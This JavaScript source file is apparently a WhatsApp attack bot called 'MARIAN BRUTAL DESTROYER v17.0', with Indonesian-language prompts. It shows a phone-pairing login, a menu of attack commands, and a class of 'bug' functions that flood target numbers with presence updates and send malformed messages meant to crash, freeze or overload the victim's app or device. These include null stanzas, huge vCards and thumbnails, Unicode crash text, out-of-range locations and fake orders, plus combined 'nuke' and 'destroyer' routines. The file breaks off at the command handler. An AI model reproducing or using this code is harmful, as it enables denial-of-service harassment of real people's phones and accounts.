// ============================================================
// ⚡ MARIAN BRUTAL DESTROYER v17.0 - COMPLETE TERMINAL SYSTEM ⚡
// ============================================================
// 🔥 ALL 25 BUGS + FC-INVIS BRUTAL v4.0 + TERMINAL PAIRING UI 🔥
// ============================================================

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    proto,
    getContentType,
    downloadContentFromMessage,
    Browsers,
    fetchLatestBaileysVersion,
    makeInMemoryStore
} = require("@whiskeysockets/baileys")

const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const readline = require('readline')
const moment = require('moment-timezone')
const WebSocket = require('ws')
const net = require('net')
const dns = require('dns')
const { exec } = require('child_process')
const { performance } = require('perf_hooks')

// ==================== [ CONFIGURASI SISTEM ] ====================
const CONFIG = {
    VERSION: "17.0.0",
    NAME: "MARIAN BRUTAL DESTROYER",
    SESSION_DIR: "marian_session",
    PREFIX: "/",
    AUTO_LOGIN: true,
    BROWSER: ["Ubuntu", "Chrome", "125.0.0.0"],
    TIMEZONE: "Asia/Jakarta",
    MAX_ATTACKS: 9999,
    FC_INVIS_INTENSITY: 100,
    SYNC_BOMB_DELAY: 0.5,
    PACKET_FLOOD_RATE: 10000
}

// ==================== [ UTILITY FUNCTIONS ] ====================
function log(type, message) {
    const colors = {
        'INFO': chalk.blue,
        'SUCCESS': chalk.green.bold,
        'WARNING': chalk.yellow,
        'ERROR': chalk.red,
        'ATTACK': chalk.magenta.bold,
        'DB_DESTROY': chalk.red.bold.bgBlack,
        'THERMAL': chalk.yellow.bold.bgBlack,
        'UI_CRASH': chalk.magenta.bold.bgBlack,
        'BUSINESS': chalk.green.bold.bgBlack,
        'SYNC_NUKE': chalk.cyan.bold.bgRed,
        'FC_INVIS': chalk.magenta.bold.bgRed,
        'STANZA_HANG': chalk.red.bold.bgYellow,
        'SOCKET_KILL': chalk.white.bold.bgRed,
        'LOGIN': chalk.cyan.bold,
        'MENU': chalk.green.bold
    }
    const time = moment().tz(CONFIG.TIMEZONE).format('HH:mm:ss')
    const color = colors[type] || chalk.white
    console.log(color(`[${time}] [${type}] ${message}`))
}

function generateRandomId() {
    return Crypto.randomBytes(32).toString('hex') + Date.now()
}

function generateCorruptedBuffer(size = 5 * 1024 * 1024) {
    const buffer = Buffer.alloc(size)
    for (let i = 0; i < size; i++) {
        buffer[i] = Math.floor(Math.random() * 256)
    }
    return buffer
}

function createMalformedStanza() {
    const corruptions = [
        '\u0000\u0000\u0000',
        '��NULL��',
        Buffer.from([0xFF, 0xFE, 0xFD, 0xFC]).toString(),
        '<!--[CDATA[>>',
        ']]>]]>',
        '񩍘񩍘񩍘',
        '\\x00\\x00\\x00',
        '\ufffd\ufffd\ufffd'
    ]
    
    return {
        type: ['iq', 'message', 'presence', 'stream:error'][Math.floor(Math.random() * 4)],
        id: `CORRUPT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        data: corruptions[Math.floor(Math.random() * corruptions.length)].repeat(500)
    }
}

// ==================== [ TERMINAL PAIRING SYSTEM ] ====================
async function terminalPairing() {
    console.clear()
    console.log(chalk.red.bold(`
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║      ⚡ MARIAN BRUTAL DESTROYER v17.0 - TERMINAL LOGIN     ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
    `))
    
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    })
    
    return new Promise((resolve) => {
        rl.question(chalk.yellow('\n📱 MASUKKAN NOMOR BOT (62xxx): '), async (phoneNumber) => {
            const cleanNumber = phoneNumber.replace(/[^0-9]/g, '')
            
            if (!cleanNumber.startsWith('62')) {
                console.log(chalk.red('\n[✗] Format salah! Gunakan 62xxx (contoh: 628123456789)'))
                rl.close()
                process.exit(1)
            }
            
            log('LOGIN', `Memulai pairing untuk ${cleanNumber}...`)
            
            try {
                const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR)
                
                const { version } = await fetchLatestBaileysVersion()
                const sock = makeWASocket({
                    version,
                    logger: pino({ level: 'silent' }),
                    printQRInTerminal: false,
                    browser: CONFIG.BROWSER,
                    auth: state,
                    generateHighQualityLinkPreview: true,
                    markOnlineOnConnect: true
                })
                
                sock.ev.on('creds.update', saveCreds)
                
                if (!sock.authState.creds.registered) {
                    log('LOGIN', 'Minta kode pairing...')
                    
                    let pairingCode = await sock.requestPairingCode(cleanNumber)
                    pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode
                    
                    console.log(chalk.bgGreen.black('\n══════════════════════════════════════════════════════════════════════'))
                    console.log(chalk.white.bold.bgGreen(`                  KODE PAIRING: ${pairingCode}                  `))
                    console.log(chalk.bgGreen.black('══════════════════════════════════════════════════════════════════════\n'))
                    
                    console.log(chalk.cyan('📱 CARA PAIRING:'))
                    console.log(chalk.white('1. Buka WhatsApp di HP'))
                    console.log(chalk.white('2. Settings → Linked Devices → Link a Device'))
                    console.log(chalk.white(`3. Masukkan kode: ${pairingCode}`))
                    console.log(chalk.white('4. Setujui dalam 2 menit\n'))
                    
                    console.log(chalk.yellow('⏳ Menunggu persetujuan...'))
                    
                    let connected = false
                    sock.ev.on('connection.update', (update) => {
                        if (update.connection === 'open') {
                            connected = true
                            log('SUCCESS', 'Login berhasil! Sistem aktif...')
                            
                            // Kirim menu ke bot
                            const botJid = cleanNumber + '@s.whatsapp.net'
                            sock.sendMessage(botJid, { 
                                text: generateMenu() 
                            })
                            
                            console.log(chalk.green.bold('\n✅ SISTEM AKTIF!'))
                            console.log(chalk.white('   • Bot sudah online'))
                            console.log(chalk.white('   • Kirim "/menu" ke bot untuk menu'))
                            console.log(chalk.white('   • Sistem ready untuk attack\n'))
                            
                            resolve(sock)
                        }
                    })
                    
                    // Timeout 2 menit
                    setTimeout(() => {
                        if (!connected) {
                            console.log(chalk.red('\n[✗] Timeout! Pairing gagal.'))
                            rl.close()
                            process.exit(1)
                        }
                    }, 120000)
                    
                } else {
                    log('SUCCESS', 'Session ditemukan, langsung login...')
                    resolve(sock)
                }
                
                rl.close()
                
            } catch (error) {
                log('ERROR', `Login gagal: ${error.message}`)
                console.log(chalk.red('\n[✗] Login gagal! Coba lagi.'))
                rl.close()
                process.exit(1)
            }
        })
    })
}

// ==================== [ MENU SYSTEM ] ====================
function generateMenu() {
    return `╔════════════════════════════════════════╗
║       ⚡ MARIAN BRUTAL DESTROYER v17.0     ║
╠════════════════════════════════════════╣
║ 🔴 DATABASE DESTROYER                 ║
║ /nullstanza [nomor] [jumlah]          ║
║ /packetflood [nomor] [paket]          ║
║ /receiptloop [nomor]                  ║
║ /forward999 [nomor] [jumlah]          ║
║ /stickermeta [nomor]                  ║
║                                         ║
║ 🟠 THERMAL THROTTLING                  ║
║ /oomaudio [nomor] [jumlah]            ║
║ /heavyvcard [nomor]                   ║
║ /unicodewaterfall [nomor]             ║
║ /ghostthumbnail [nomor]               ║
║ /gifloopdead [nomor]                  ║
║                                         ║
║ 🟡 UI CRASH ATTACK                     ║
║ /quotedcall [nomor]                   ║
║ /location999 [nomor]                  ║
║ /buttonloop [nomor]                   ║
║ /invitecrash [nomor]                  ║
║ /reactionboom [nomor] [jumlah]        ║
║                                         ║
║ 🟢 BUSINESS ATTACK                     ║
║ /priceerror [nomor]                   ║
║ /orderfake [nomor]                    ║
║ /docom [nomor]                        ║
║ /profilebomb [nomor]                  ║
║ /polloverload [nomor]                 ║
║                                         ║
║ ⚡ FC-INVIS BRUTAL                     ║
║ /fcinvis [nomor] [intensitas]         ║
║ /onetick [nomor]                      ║
║ /invisblock [nomor] [detik]           ║
║ /brutalcombo [nomor]                  ║
║ /syncnuke [nomor]                     ║
║                                         ║
║ 🛠️  UTILITIES                          ║
║ /menu - Tampilkan menu ini            ║
║ /status - Cek status attack           ║
║ /stopall - Stop semua attack          ║
║ /sticker - Buat sticker dari gambar   ║
║ /destroy [nomor] - ULTIMATE COMBO     ║
╚════════════════════════════════════════╝`
}

// ==================== [ BRUTAL BUG SYSTEM ] ====================
class BrutalBugSystem {
    constructor(sock) {
        this.sock = sock
        this.activeAttacks = new Map()
        this.fcInvisActive = false
    }
    
    // 🔴 DATABASE DESTROYER v2
    async nullStanzaBug(target, count = 10) {
        log('DB_DESTROY', `[NULL STANZA] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            const msg = generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: "\u0000\u0000\u0000",
                    contextInfo: {
                        stanzaId: "",
                        participant: null,
                        quotedMessage: {
                            conversation: "\u0000"
                        }
                    }
                }
            }, { userJid: target })
            
            await this.sock.relayMessage(target, msg.message, { 
                messageId: `NULL_${Date.now()}_${i}` 
            }).catch(() => {})
            await delay(100)
        }
        return true
    }
    
    async packetFloodBug(target, packets = 1000) {
        log('DB_DESTROY', `[PACKET FLOOD] Flooding ${target} with ${packets} packets`)
        
        const floodPromises = []
        for (let i = 0; i < packets; i++) {
            floodPromises.push(
                this.sock.sendPresenceUpdate('composing', target).catch(() => {}),
                this.sock.sendPresenceUpdate('available', target).catch(() => {}),
                this.sock.sendPresenceUpdate('recording', target).catch(() => {})
            )
            if (i % 100 === 0) await delay(10)
        }
        
        await Promise.all(floodPromises)
        return true
    }
    
    async receiptLoopBug(target) {
        log('DB_DESTROY', `[RECEIPT LOOP] Starting receipt loop on ${target}`)
        
        const loopId = `RECEIPT_LOOP_${Date.now()}`
        this.activeAttacks.set(loopId, { target, running: true, type: 'receipt-loop' })
        
        const loop = setInterval(async () => {
            if (!this.activeAttacks.has(loopId)) {
                clearInterval(loop)
                return
            }
            
            try {
                await this.sock.readMessages([{
                    key: {
                        remoteJid: target,
                        id: `FAKE_MSG_${Date.now()}`,
                        fromMe: false
                    },
                    messageTimestamp: Date.now()
                }])
            } catch (e) {}
        }, 50)
        
        return loopId
    }
    
    async forwarding999Bug(target, count = 10) {
        log('DB_DESTROY', `[FORWARDING 999] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                text: "",
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "newsletter@whatsapp.net",
                        newsletterName: "FORWARD_BUG_999",
                        serverMessageId: 999999999
                    }
                }
            }).catch(() => {})
            await delay(200)
        }
        return true
    }
    
    async stickerMetadataBug(target) {
        log('DB_DESTROY', `[STICKER METADATA] Attacking ${target}`)
        
        const corruptedSticker = {
            stickerMessage: {
                url: "https://example.com/null.webp",
                fileSha256: Buffer.from("\u0000".repeat(64)),
                fileEncSha256: Buffer.from("\u0000".repeat(64)),
                mediaKey: Buffer.from("\u0000".repeat(32)),
                mimetype: "image/webp",
                height: 0,
                width: 999999,
                directPath: "/null",
                mediaKeyTimestamp: Date.now(),
                fileLength: 9999999999,
                isAnimated: true,
                firstFrameLength: 0
            }
        }
        
        const msg = generateWAMessageFromContent(target, corruptedSticker, { userJid: target })
        await this.sock.relayMessage(target, msg.message, {
            messageId: `STICKER_BUG_${Date.now()}`
        }).catch(() => {})
        
        return true
    }
    
    // 🟠 THERMAL THROTTLING v2
    async oomAudioBug(target, count = 5) {
        log('THERMAL', `[OOM AUDIO] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                audio: { 
                    url: "https://example.com/silence.mp3"
                },
                mimetype: "audio/mpeg",
                seconds: 0,
                ptt: true,
                contextInfo: {
                    expirySecs: 999999999,
                    ephemeralSettingTimestamp: Date.now() * 1000,
                    mentionedJid: [target]
                }
            }).catch(() => {})
            await delay(300)
        }
        return true
    }
    
    async heavyVCardBug(target) {
        log('THERMAL', `[HEAVY VCARD] Attacking ${target}`)
        
        const largePhoto = Buffer.alloc(8 * 1024 * 1024, 'X')
        const vcard = `BEGIN:VCARD\nVERSION:4.0\nFN:HEAVY_VCARD_CRASH\nPHOTO;ENCODING=b;TYPE=JPEG:${largePhoto.toString('base64')}\nTEL;TYPE=CELL:999999999999\nEMAIL:crash@system.com\nADR:;;HEAVY;;;;\nNOTE:${"█".repeat(5000)}\nEND:VCARD`
        
        await this.sock.sendMessage(target, {
            contacts: {
                displayName: "HEAVY_VCARD_CRASH",
                contacts: [{ vcard }]
            }
        }).catch(() => {})
        
        return true
    }
    
    async unicodeWaterfallBug(target) {
        log('THERMAL', `[UNICODE WATERFALL] Attacking ${target}`)
        
        const arabic = "ﺎﻠﻋﺮﺒﻳﺓ" + "ﺞ".repeat(200)
        const thai = "ภาษาไทย" + "ก".repeat(200)
        const zeroWidth = "​‌‍﻿".repeat(100)
        const combining = "áéíóú" + "⃝⃞⃟⃠⃡".repeat(100)
        const waterfall = arabic + "\n" + thai + "\n" + zeroWidth + "\n" + combining
        
        await this.sock.sendMessage(target, {
            text: `UNICODE_WATERFALL\n${waterfall.repeat(20)}`,
            contextInfo: {
                mentionedJid: [target]
            }
        }).catch(() => {})
        
        return true
    }
    
    async ghostThumbnailBug(target) {
        log('THERMAL', `[GHOST THUMBNAIL] Attacking ${target}`)
        
        const hugeThumbnail = Buffer.alloc(3 * 1024 * 1024, Math.random().toString(36).charAt(2))
        
        await this.sock.sendMessage(target, {
            image: {
                url: "https://example.com/ghost.jpg"
            },
            caption: "GHOST THUMBNAIL ATTACK",
            jpegThumbnail: hugeThumbnail,
            contextInfo: {
                mentionedJid: [target]
            }
        }).catch(() => {})
        
        return true
    }
    
    async gifLoopDeadBug(target) {
        log('THERMAL', `[GIF LOOP DEAD] Attacking ${target}`)
        
        await this.sock.sendMessage(target, {
            video: {
                url: "https://example.com/infinite.mp4"
            },
            gifPlayback: true,
            caption: "INFINITE LOOP GIF - NO STOP",
            contextInfo: {
                expirySecs: 0,
                ephemeralSettingTimestamp: 0,
                mentionedJid: [target]
            }
        }).catch(() => {})
        
        return true
    }
    
    // 🟡 UI CRASH ATTACK v2
    async quotedCallInfinityBug(target) {
        log('UI_CRASH', `[QUOTED CALL INFINITY] Attacking ${target}`)
        
        const callLog = {
            key: {
                remoteJid: "5521999999999@s.whatsapp.net",
                fromMe: false,
                id: "CALL_LOG_" + Date.now(),
                participant: "5521999999999@s.whatsapp.net"
            },
            message: {
                callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "999999",
                    callType: "REGULAR",
                    participants: Array.from({length: 500}, (_, i) => ({
                        jid: `${i}@s.whatsapp.net`,
                        callOutcome: "1"
                    }))
                }
            }
        };
        
        try {
            const msg = generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: "QUOTED CALL INFINITY CRASH",
                    contextInfo: {
                        mentionedJid: [target],
                        forwardingScore: 999,
                        isForwarded: false,
                        quotedMessage: callLog.message
                    }
                }
            }, {
                quoted: callLog
            });
            
            await this.sock.relayMessage(target, msg.message, {
                messageId: msg.key.id
            });
            
            return true
        } catch (error) {
            log('ERROR', `Call bug failed: ${error.message}`)
            return false
        }
    }
    
    async locationOutOfRangeBug(target) {
        log('UI_CRASH', `[LOCATION OUT OF RANGE] Attacking ${target}`)
        
        await this.sock.sendMessage(target, {
            location: {
                degreesLatitude: 999.999999,
                degreesLongitude: 999.999999,
                name: "OUT_OF_RANGE_" + "█".repeat(1000),
                address: "COORDINATES_BEYOND_LIMIT\n" + "⚠️".repeat(200),
                comment: "SYSTEM CRASH"
            }
        }).catch(() => {})
        
        return true
    }
    
    async buttonLoopBug(target) {
        log('UI_CRASH', `[BUTTON LOOP] Attacking ${target}`)
        
        const buttonMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    title: "BUTTON LOOP CRASH",
                    hasMediaAttachment: false
                },
                body: {
                    text: "Click will trigger infinite recursion"
                },
                footer: {
                    text: "MARIAN BRUTAL DESTROYER"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "CRASH NOW",
                            url: "whatsapp://crash",
                            merchant_url: "whatsapp://crash"
                        })
                    }]
                },
                contextInfo: {
                    mentionedJid: [target],
                    quotedMessage: {
                        conversation: "LOOP_TRIGGER"
                    }
                }
            }
        }, { userJid: target })
        
        await this.sock.relayMessage(target, buttonMsg.message, {
            messageId: `BUTTON_LOOP_${Date.now()}`
        }).catch(() => {})
        
        return true
    }
    
    async inviteLinkCrashBug(target) {
        log('UI_CRASH', `[INVITE LINK CRASH] Attacking ${target}`)
        
        const crazyName = "𑫀".repeat(2000) + "∑∫∮∯∰∇∆∂" + "█".repeat(1000)
        
        await this.sock.sendMessage(target, {
            groupInviteMessage: {
                groupJid: "999999999-999999@g.us",
                inviteCode: "CRASHINVITE",
                groupName: crazyName,
                inviteExpiration: Date.now() + 999999999,
                groupType: "DEFAULT"
            }
        }).catch(() => {})
        
        return true
    }
    
    async reactionExplosionBug(target, reactions = 500) {
        log('UI_CRASH', `[REACTION EXPLOSION] Attacking ${target} with ${reactions} reactions`)
        
        const messageId = `TARGET_${Date.now()}`
        await this.sock.sendMessage(target, {
            text: "REACTION TARGET"
        }).catch(() => {})
        
        await delay(500)
        
        const emojis = ["❤️", "😂", "😮", "😢", "👏", "🔥", "⭐", "👍", "🎉", "😡"]
        const promises = []
        
        for (let i = 0; i < reactions; i++) {
            if (i % 50 === 0) await delay(10)
            const reaction = {
                key: {
                    remoteJid: target,
                    id: messageId,
                    fromMe: true
                },
                text: emojis[i % emojis.length],
                senderTimestampMs: Date.now()
            }
            // Note: Implement actual reaction sending
        }
        
        return true
    }
    
    // 🟢 BUSINESS ATTACK v2
    async priceCurrencyErrorBug(target) {
        log('BUSINESS', `[PRICE CURRENCY ERROR] Attacking ${target}`)
        
        await this.sock.sendMessage(target, {
            productMessage: {
                product: {
                    productImage: {
                        url: "https://example.com/corrupt.jpg"
                    },
                    title: "CORRUPTED PRODUCT",
                    description: "PRODUCT WITH INVALID CURRENCY CODE",
                    currencyCode: "INVALID_CURRENCY_999",
                    priceAmount1000: 9999999999999,
                    retailerId: "CRASH_" + Date.now()
                },
                businessOwnerJid: target
            }
        }).catch(() => {})
        
        return true
    }
    
    async orderFakeBug(target) {
        log('BUSINESS', `[ORDER FAKE] Attacking ${target}`)
        
        await this.sock.sendMessage(target, {
            orderMessage: {
                orderId: `FAKE_ORDER_${Date.now()}`,
                thumbnail: generateCorruptedBuffer(50000),
                itemCount: 999999,
                status: "PENDING",
                surface: "CATALOG",
                message: "FAKE ORDER WITH MILLION ITEMS",
                orderTitle: "MILLION ITEM ORDER - CRASH",
                sellerJid: target,
                totalAmount1000: 999999999999
            }
        }).catch(() => {})
        
        return true
    }
    
    async docOomBug(target) {
        log('BUSINESS', `[DOC OOM] Attacking ${target}`)
        
        await this.sock.sendMessage(target, {
            document: {
                url: "https://example.com/malicious.pdf"
            },
            fileName: `CORRUPTED_${Date.now()}.pdf`,
            mimetype: "application/pdf",
            fileLength: 99999999999,
            pageCount: 99999,
            title: "MALICIOUS PDF - OOM CRASH",
            contextInfo: {
                expirySecs: 0,
                mentionedJid: [target]
            }
        }).catch(() => {})
        
        return true
    }
    
    async profilePictureBombBug(target) {
        log('BUSINESS', `[PROFILE PICTURE BOMB] Attacking ${target}`)
        
        await this.sock.sendMessage(target, {
            text: "⚠️ PROFILE PICTURE CRASH LINK:\nwhatsapp://profile?action=change&image=https://example.com/corrupt.jpg&size=9999999999",
            contextInfo: {
                mentionedJid: [target],
                forwardingScore: 1,
                isForwarded: false,
                quotedMessage: {
                    conversation: "Click link to crash WhatsApp"
                }
            }
        }).catch(() => {})
        
        return true
    }
    
    async pollOverloadBug(target) {
        log('BUSINESS', `[POLL OVERLOAD] Attacking ${target}`)
        
        const options = Array.from({length: 200}, (_, i) => ({
            optionName: `OPTION_${i}_` + "𑫀".repeat(100) + "█".repeat(50)
        }))
        
        await this.sock.sendMessage(target, {
            pollCreationMessage: {
                name: "OVERLOAD POLL CRASH " + "█".repeat(500),
                options: options,
                selectableOptionsCount: 200
            }
        }).catch(() => {})
        
        return true
    }
    
    // ⚡ FC-INVIS BRUTAL SYSTEM v4
    async fcInvisAttack(target, intensity = 50) {
        log('FC_INVIS', `[FC-INVIS BRUTAL] Starting sync stream attack on ${target}`)
        
        this.fcInvisActive = true
        const attackId = `FC_INVIS_${Date.now()}`
        this.activeAttacks.set(attackId, { target, running: true, type: 'fc-invis' })
        
        // 🔥 Sync Stream Bombing
        const syncAttack = async () => {
            log('SYNC_NUKE', `[SYNC STREAM BOMB] Intensity: ${intensity}`)
            
            // Stanza flood
            for (let i = 0; i < intensity * 100; i++) {
                if (!this.activeAttacks.has(attackId)) break
                
                try {
                    // Corrupted presence updates
                    await this.sock.sendPresenceUpdate('composing', target)
                    await this.sock.sendPresenceUpdate('available', target)
                    await this.sock.sendPresenceUpdate('recording', target)
                    await this.sock.sendPresenceUpdate('paused', target)
                } catch (e) {}
                
                if (i % 100 === 0) await delay(1)
            }
        }
        
        // 🔥 Message Queue Flood
        const queueFlood = async () => {
            for (let i = 0; i < intensity * 50; i++) {
                if (!this.activeAttacks.has(attackId)) break
                
                await this.sock.sendMessage(target, {
                    text: `FC_INVIS_QUEUE_${i}_` + generateRandomId().slice(0, 50),
                    contextInfo: {
                        stanzaId: '',
                        participant: target,
                        quotedMessage: {
                            conversation: ''
                        }
                    }
                }).catch(() => {})
                
                if (i % 50 === 0) await delay(2)
            }
        }
        
        // 🔥 One Tick Attack
        const oneTick = async () => {
            log('FC_INVIS', '[ONE TICK ATTACK] Executing...')
            
            await this.sock.sendMessage(target, {
                text: 'ONE_TICK_FC_INVIS_' + generateRandomId(),
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    mentionedJid: [target],
                    quotedMessage: {
                        extendedTextMessage: {
                            text: '',
                            contextInfo: {
                                stanzaId: '',
                                participant: ''
                            }
                        }
                    }
                }
            }).catch(() => {})
        }
        
        // 🔥 Invisible Block
        const invisibleBlock = async () => {
            log('FC_INVIS', '[INVISIBLE BLOCK] Blocking sync stream...')
            
            // Create blocking messages
            for (let i = 0; i < 100; i++) {
                await this.sock.sendMessage(target, {
                    text: `BLOCK_${i}_` + "█".repeat(100),
                    contextInfo: {
                        stanzaId: generateRandomId(),
                        participant: target,
                        quotedMessage: {
                            conversation: "SYNC_BLOCK"
                        }
                    }
                }).catch(() => {})
                await delay(10)
            }
        }
        
        // Execute all attacks
        await Promise.all([
            syncAttack(),
            queueFlood(),
            oneTick(),
            invisibleBlock()
        ])
        
        // Background maintenance
        this.maintainFcInvis(target, attackId, intensity)
        
        return attackId
    }
    
    maintainFcInvis(target, attackId, intensity) {
        const maintainInterval = setInterval(async () => {
            if (!this.activeAttacks.has(attackId)) {
                clearInterval(maintainInterval)
                return
            }
            
            try {
                // Keep stream alive with corrupted data
                await this.sock.sendPresenceUpdate('composing', target)
                await delay(100)
                await this.sock.sendPresenceUpdate('available', target)
                
                // Send keep-alive corruption
                await this.sock.sendMessage(target, {
                    text: 'FC_INVIS_KEEPALIVE_' + Date.now(),
                    contextInfo: {
                        stanzaId: '',
                        participant: target
                    }
                }).catch(() => {})
                
            } catch (e) {}
        }, 5000)
        
        // Auto stop after 1 hour
        setTimeout(() => {
            if (this.activeAttacks.has(attackId)) {
                this.activeAttacks.delete(attackId)
                log('INFO', `FC-INVIS attack ${attackId} auto-stopped`)
            }
            clearInterval(maintainInterval)
        }, 3600000)
    }
    
    async oneTickAttack(target) {
        log('FC_INVIS', `[ONE TICK] Special attack on ${target}`)
        
        const attackId = `ONE_TICK_${Date.now()}`
        this.activeAttacks.set(attackId, { target, running: true, type: 'one-tick' })
        
        // Send special corrupted message
        await this.sock.sendMessage(target, {
            text: '',
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [target],
                quotedMessage: {
                    extendedTextMessage: {
                        text: '\u0000',
                        contextInfo: {
                            stanzaId: '\u0000',
                            participant: '\u0000'
                        }
                    }
                }
            }
        }).catch(() => {})
        
        // Immediate presence flood
        for (let i = 0; i < 500; i++) {
            await this.sock.sendPresenceUpdate('composing', target).catch(() => {})
            await delay(1)
        }
        
        return attackId
    }
    
    async invisibleBlockAttack(target, seconds = 300) {
        log('FC_INVIS', `[INVISIBLE BLOCK] Blocking ${target} for ${seconds} seconds`)
        
        const blockId = `INVIS_BLOCK_${Date.now()}`
        this.activeAttacks.set(blockId, { target, running: true, type: 'invis-block' })
        
        // Create blocking queue
        for (let i = 0; i < 50; i++) {
            await this.sock.sendMessage(target, {
                text: `BLOCK_QUEUE_${i}_` + generateRandomId(),
                contextInfo: {
                    stanzaId: '',
                    participant: target,
                    quotedMessage: {
                        conversation: ''
                    }
                }
            }).catch(() => {})
            await delay(50)
        }
        
        // Auto unblock
        setTimeout(() => {
            if (this.activeAttacks.has(blockId)) {
                this.activeAttacks.delete(blockId)
                log('SUCCESS', `Invisible block on ${target} expired`)
            }
        }, seconds * 1000)
        
        return blockId
    }
    
    async brutalFcInvisCombo(target) {
        log('FC_INVIS', `[BRUTAL COMBO] Ultimate FC-INVIS attack on ${target}`)
        
        const comboId = `BRUTAL_COMBO_${Date.now()}`
        this.activeAttacks.set(comboId, { target, running: true, type: 'brutal-combo' })
        
        // Execute all FC-INVIS attacks
        await this.oneTickAttack(target)
        await delay(1000)
        
        await this.fcInvisAttack(target, 100)
        await delay(1000)
        
        await this.invisibleBlockAttack(target, 1800) // 30 minutes
        await delay(1000)
        
        // Combine with other bugs
        await this.nullStanzaBug(target, 5)
        await delay(500)
        
        await this.packetFloodBug(target, 1000)
        
        return comboId
    }
    
    async syncNuke(target) {
        log('SYNC_NUKE', `[SYNC NUKE] Nuclear sync attack on ${target}`)
        
        const nukeId = `SYNC_NUKE_${Date.now()}`
        this.activeAttacks.set(nukeId, { target, running: true, type: 'sync-nuke' })
        
        // Maximum intensity attack
        const attacks = Array.from({length: 20}, (_, i) => 
            this.sock.sendPresenceUpdate(['composing', 'available', 'recording', 'paused'][i % 4], target)
        )
        
        for (let i = 0; i < 1000; i++) {
            await Promise.all(attacks).catch(() => {})
            if (i % 100 === 0) await delay(5)
        }
        
        return nukeId
    }
    
    // ==================== [ ATTACK CONTROL ] ====================
    
    stopAttack(attackId) {
        if (this.activeAttacks.has(attackId)) {
            this.activeAttacks.delete(attackId)
            log('SUCCESS', `Attack ${attackId} stopped`)
            return true
        }
        return false
    }
    
    stopAllAttacks() {
        const count = this.activeAttacks.size
        this.activeAttacks.clear()
        this.fcInvisActive = false
        log('SUCCESS', `Stopped ${count} active attacks`)
        return count
    }
    
    getAttackStatus() {
        return {
            total: this.activeAttacks.size,
            attacks: Array.from(this.activeAttacks.entries()).map(([id, data]) => ({
                id: id.slice(0, 8) + '...',
                target: data.target?.split('@')[0] || 'unknown',
                type: data.type,
                running: data.running
            })),
            fcInvisActive: this.fcInvisActive
        }
    }
    
    // ==================== [ ULTIMATE DESTROYER ] ====================
    
    async ultimateDestroyer(target) {
        log('ATTACK', `[ULTIMATE DESTROYER] Starting complete destruction on ${target}`)
        
        const destroyerId = `DESTROYER_${Date.now()}`
        this.activeAttacks.set(destroyerId, { target, running: true, type: 'destroyer' })
        
        log('DB_DESTROY', 'Phase 1: Database Destroyer')
        await this.nullStanzaBug(target, 15)
        await this.packetFloodBug(target, 2000)
        await this.forwarding999Bug(target, 10)
        
        log('THERMAL', 'Phase 2: Thermal Throttling')
        await this.oomAudioBug(target, 8)
        await this.heavyVCardBug(target)
        await this.unicodeWaterfallBug(target)
        
        log('UI_CRASH', 'Phase 3: UI Crash')
        await this.quotedCallInfinityBug(target)
        await this.locationOutOfRangeBug(target)
        await this.buttonLoopBug(target)
        
        log('BUSINESS', 'Phase 4: Business Attack')
        await this.priceCurrencyErrorBug(target)
        await this.orderFakeBug(target)
        await this.pollOverloadBug(target)
        
        log('FC_INVIS', 'Phase 5: FC-INVIS Brutal')
        await this.brutalFcInvisCombo(target)
        
        log('SYNC_NUKE', 'Phase 6: Sync Nuke')
        await this.syncNuke(target)
        
        log('SUCCESS', `Ultimate Destroyer attack on ${target} completed`)
        return destroyerId
    }
}

// ==================== [ STICKER MAKER v2 ] ====================
class StickerMaker {
    static async createSticker(imageBuffer) {
        try {
            const tmpFileOut = path.join(tmpdir(), `${generateRandomId()}.webp`)
            const tmpFileIn = path.join(tmpdir(), `${generateRandomId()}.jpg`)
            
            fs.writeFileSync(tmpFileIn, imageBuffer)
            
            await new Promise((resolve, reject) => {
                ff(tmpFileIn)
                    .on('error', reject)
                    .on('end', resolve)
                    .addOutputOptions([
                        "-vcodec", "libwebp",
                        "-vf", "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000,setsar=1",
                        "-loop", "0",
                        "-lossless", "1",
                        "-qscale", "100"
                    ])
                    .toFormat('webp')
                    .save(tmpFileOut)
            })
            
            const stickerBuffer = fs.readFileSync(tmpFileOut)
            
            // Cleanup
            fs.unlinkSync(tmpFileOut)
            fs.unlinkSync(tmpFileIn)
            
            return stickerBuffer
        } catch (error) {
            log('ERROR', `Sticker creation failed: ${error.message}`)
            return null
        }
    }
    
    static async createStickerFromUrl(imageUrl) {
        try {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' })
            return await this.createSticker(Buffer.from(response.data))
        } catch (error) {
            log('ERROR', `Failed to download image: ${error.message}`)
            return null
        }
    }
}

// ==================== [ COMMAND HANDLER v2 ] ====================
class CommandHandler {
    constructor(sock, bugSystem) {
        this.sock = sock
        this.bugs = bugSystem
    }
    
    async handle(from, body, quoted, message) {
